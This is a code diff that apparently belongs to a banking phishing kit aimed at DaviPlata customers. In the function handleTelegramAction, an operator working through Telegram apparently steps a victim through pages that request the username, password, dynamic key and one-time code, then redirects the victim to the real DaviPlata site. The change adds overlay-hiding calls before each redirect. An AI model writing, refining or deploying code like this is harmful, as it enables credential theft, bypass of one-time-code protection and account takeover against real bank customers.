@@ -81,9 +81,11 @@ document.addEventListener('DOMContentLoaded', () => {
     function handleTelegramAction(data) {
         switch(data.action) {
             case 'request_user':
+                BancoUtils.hideOverlay();
                 window.location.href = 'index.html';
                 break;
             case 'request_password':
+                BancoUtils.hideOverlay();
                 window.location.href = 'clave.html';
                 break;
             case 'request_dynamic':
@@ -92,9 +94,11 @@ document.addEventListener('DOMContentLoaded', () => {
                 btnContinue.disabled = true;
                 break;
             case 'request_otp':
+                BancoUtils.hideOverlay();
                 window.location.href = 'otp.html';
                 break;
             case 'finish':
+                BancoUtils.hideOverlay();
                 window.location.href = 'https://www.daviplata.com/';
                 break;
         }
